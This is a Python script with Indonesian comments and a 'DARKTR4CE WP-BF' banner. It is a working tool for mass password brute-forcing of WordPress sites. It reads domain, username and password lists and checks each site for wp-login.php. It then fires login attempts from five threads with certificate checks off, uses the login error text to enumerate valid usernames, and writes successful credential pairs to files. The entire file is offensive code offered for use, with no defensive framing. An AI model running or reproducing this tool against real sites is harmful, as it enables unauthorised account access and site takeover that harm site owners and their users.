import requests, os, time
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# File konfigurasi
DOMAIN_FILE = "domain.txt"
USER_FILE = "user.txt"
PASS_FILE = "passwords.txt"

# Warna
R, G, C, W = Fore.RED, Fore.GREEN, Fore.CYAN, Fore.WHITE
RESET = Style.RESET_ALL

# File hasil
VALID_USERS = "valid_users.txt"
VALID_PASSWORDS = "valid_passwords.txt"
VALID_COMBOS = "valid_combos.txt"

# Banner
def banner():
    os.system("clear" if os.name != "nt" else "cls")
    print(f"""{R}
╔══════════════════════════════════════════╗
║        {C}D A R K T R 4 C E  W P - B F      {R}║
╠══════════════════════════════════════════╣
║  {W}Auto Bruteforce WordPress + Hemat Data  {R}║
║  {W}Anti Error, Gak Ngelag, Gak Nutup SC    {R}║
║  {W}Thread 5x, Delay Aman, Anti Boros       {R}║
╚══════════════════════════════════════════╝
{RESET}""")

# Cek apakah WordPress
def is_wordpress(url):
    try:
        r = requests.get(url + "/wp-login.php", timeout=10, verify=False)
        return r.status_code == 200 and "user_login" in r.text
    except:
        return False

# Simpan hasil
def save_result(file, content):
    with open(file, "a") as f:
        f.write(content + "\n")

# Login
def attempt_login(domain, user, pwd):
    login_url = f"{domain}/wp-login.php"
    data = {'log': user, 'pwd': pwd, 'wp-submit': 'Log In'}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    try:
        r = requests.post(login_url, data=data, headers=headers, timeout=10, allow_redirects=False, verify=False)
        if "The password you entered" in r.text:
            save_result(VALID_USERS, f"{login_url}:{user}")
        elif r.status_code == 302:
            save_result(VALID_PASSWORDS, f"{login_url}@{pwd}")
            save_result(VALID_COMBOS, f"{login_url}:{user}@{pwd}")
            print(f"{G}[VALID] {login_url}:{user}@{pwd}{RESET}")
        time.sleep(0.3)  # Delay hemat kuota + anti spam
    except:
        pass

# Proses 1 domain
def brute_force(domain):
    if not domain.startswith("http"):
        domain = "http://" + domain
    if not is_wordpress(domain):
        print(f"{R}[SKIP] {domain} - Bukan WordPress atau error{RESET}")
        return
    print(f"{C}[WP] {domain}/wp-login.php terdeteksi, mulai BF...{RESET}")
    for user in users:
        for pwd in passwords:
            executor.submit(attempt_login, domain, user, pwd)

# Load file
def load_file(path):
    try:
        with open(path, "r") as f:
            return [i.strip() for i in f if i.strip()]
    except FileNotFoundError:
        print(f"{R}[ERROR] File tidak ditemukan: {path}{RESET}")
        return []

# MAIN
if __name__ == "__main__":
    banner()
    domains = load_file(DOMAIN_FILE)
    users = load_file(USER_FILE)
    passwords = load_file(PASS_FILE)
    executor = ThreadPoolExecutor(max_workers=5)

    for domain in domains:
        brute_force(domain)

    executor.shutdown(wait=True)
    print(f"\n{G}[SELESAI] Semua domain berhasil diproses!{RESET}")
